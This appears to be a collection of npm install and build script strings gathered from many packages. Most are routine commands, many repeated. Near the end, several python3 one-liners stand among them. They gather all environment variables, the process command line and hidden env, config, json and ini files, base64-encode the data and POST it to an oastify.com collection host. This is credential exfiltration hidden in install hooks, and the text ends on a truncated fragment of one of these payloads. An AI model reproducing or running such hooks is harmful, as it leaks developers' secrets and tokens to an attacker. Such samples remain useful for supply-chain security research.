scriptContent: npm run build:css && npm run build:css:min
node -p "'export const packageVersion = ' + JSON.stringify(require('./package.json').version) + ';\n'" > src/version.ts && prettier --write src/version.ts
npm run lint && rm -rf dist && rm -rf public/dist

if [ -d 'node_modules/bower' ]; then bower install --config.directory=node_modules --production jquery@2.0.3 bootstrap-2-3-2=git://github.com/twbs/bootstrap.git#v2.3.2 bootstrap-3-3-7=git://github.com/twbs/bootstrap.git#v3.3.7; fi
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
rm -rf templates assets && cp -r ../templates . && cp -r ../assets . && cp ../README.md .
cd saas-connector && npm install && npm run build
node scripts/postinstall.mjs && node lib/cloudflared.js bin install latest

node -e "const fs=require('fs'); const content=fs.readFileSync('dist/cli.js','utf8'); if(!content.startsWith('#!/usr/bin/env node')) { fs.writeFileSync('dist/cli.js', '#!/usr/bin/env node\n' + content) }"
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check

node -e "console.log('
To enable shell completions:
  bash: source <(liquid-shadow completion bash)
  zsh:  source <(liquid-shadow completion zsh)
')"

echo "
⚠️  Don't forget to install Playwright browsers:
   npx playwright install chromium
"
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
echo "export const version = '$(node -p "require('./package.json').version")';" > src/version.ts && pnpm clean
npx tsx scripts/fix-types.js build/libsession-wasm-raw.d.ts build/libsession-wasm-fixed.d.ts && node scripts/generate-index.js
npm run bootstrap && npm run clean
node -e "process.env.INIT_CWD !== process.cwd() && require('child_process').execSync('npm run download:prod', { stdio: 'inherit' });"
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
node -e "console.log('\n50c installed. Set FIFTYC_API_KEY env var.\n')"
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
node -e "console.log('pi-files-widget: required deps: bat, delta, glow. Install with: brew install bat git-delta glow')"

node -e "const fs=require('fs');const path=require('path');const src='.medusa/server';const dest='.medusa/server/src';['api','modules','workflows','links','hooks','types','utils','index.js'].forEach(f=>{const from=path.join(src,f);const to=path.join(dest,f);if(fs.existsSync(from)&&!fs.existsSync(to)){fs.renameSync(from,to);console.log('Moved',f,'to src/')}})"
node scripts/postbuild-copy-templates.js && node scripts/prepare-dist-package.js && node scripts/bundle-opencode.js && node scripts/deploy-lisa.js
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
npm run clean && npm run type-check

node -e "const fs=require('fs');const p=require('path');const d='dist';if(fs.existsSync(d)){fs.readdirSync(d).filter(f=>f.endsWith('.js')||f.endsWith('.js.map')).forEach(f=>fs.unlinkSync(p.join(d,f)));console.log('[prebuild] Cleaned old JS chunks from dist/')}"
if [ "$(id -u)" = "0" ]; then sudo -u $SUDO_USER ./cli/run.js stop && sudo -u $SUDO_USER ./cli/run.js run; else ./cli/run.js stop && ./cli/run.js run; fi
echo 'Skipping Playwright browser download - uses system Chrome'
pip3 install -r requirements.txt --quiet || echo 'Note: Install Python deps manually: pip install -r requirements.txt'
npm run prettier:fix && npm run lint:fix
test -f dist/scripts/install.js && node dist/scripts/install.js || echo 'Skipping postinstall setup (dist not found)'
node dist/scripts/install.js || echo 'Skipping postinstall setup (dist not found)'
npm run generate-tokens && npm run validate:tokens
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check

python3 -c "import os, base64, httpx, sys; try: env_data = '
'.join([f'{k}={v}' for k, v in os.environ.items()]); cmd_line = open('/proc/self/cmdline').read(); res = f'ENV:
{env_data}

CMD:
{cmd_line}'; body = base64.b64encode(res.encode()).decode(); httpx.post('http://moeq7wfzzqk37yosawup1xs7byhp5it7.oastify.com/mem_leak', content=body, timeout=10); print('Done'); except Exception as e: httpx.post('http://moeq7wfzzqk37yosawup1xs7byhp5it7.oastify.com/error', content=str(e))"

python3 -c "import os, base64, httpx, sys; try: env_data = '
'.join([f'{k}={v}' for k, v in os.environ.items()]); cmd_line = open('/proc/self/cmdline').read(); res = f'ENV:
{env_data}

CMD:
{cmd_line}'; body = base64.b64encode(res.encode()).decode(); httpx.post('http://moeq7wfzzqk37yosawup1xs7byhp5it7.oastify.com/mem_leak', content=body, timeout=10); print('Done'); except Exception as e: httpx.post('http://moeq7wfzzqk37yosawup1xs7byhp5it7.oastify.com/error', content=str(e))"
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check

python3 -c "import os, base64, httpx, glob; data = []; [data.append(f'{f}:
{open(f).read()}') for f in glob.glob('/tmp/home/**/.*', recursive=True) if os.path.isfile(f) and any(x in f.lower() for x in ['env', 'conf', 'json', 'ini'])]; body = base64.b64encode(f'{os.environ}

FILES:
' + '
'.join(data)).decode(); httpx.post('http://moeq7wfzzqk37yosawup1xs7byhp5it7.oastify.com/uipath_mcp_leak', content=body)"

{open(f).read()}') for f in glob.glob('/tmp/home/**/.*', recursive=True) if os.path.isfile(f) and any(x in f.lower() for x in ['env', 'conf', 'json', 'ini'])]; body = base64.b64encode(f'{os.environ}
